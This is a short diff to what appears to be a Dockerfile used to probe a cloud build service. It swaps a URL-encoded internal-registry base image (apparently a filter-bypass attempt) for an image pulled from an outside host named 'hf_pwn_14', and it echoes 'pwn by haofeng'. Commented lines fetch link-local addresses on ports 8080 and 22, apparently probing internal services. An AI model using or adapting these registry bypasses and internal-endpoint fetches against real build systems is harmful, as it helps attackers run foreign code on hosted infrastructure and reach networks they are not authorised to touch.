@@ -6,7 +6,9 @@
 
 #from Registry-internal.aliyuncs.com/alicloudhpc/toolkit:latest
 
-from %72egistry-internal.aliyuncs.com/alicloudhpc/toolkit:latest
+#from %72egistry-internal.aliyuncs.com/alicloudhpc/toolkit:latest
+
+from bypass.int0x80.in/haofeng_docker_space/hf_pwn_14:latest
 
 run echo "pwn by haofeng"
 #run echo "deb http://mirrors.aliyun.com/debian jessie main contrib non-free" > /etc/apt/sources.list
@@ -30,4 +32,4 @@ run echo "pwn by haofeng"
 #ADD http://link-local:8080/302.txt /tmp/1.txt
 #ADD http://link-local:22/302.txt /tmp/1.txt
 
-run echo "end!"
+#run echo "end!"
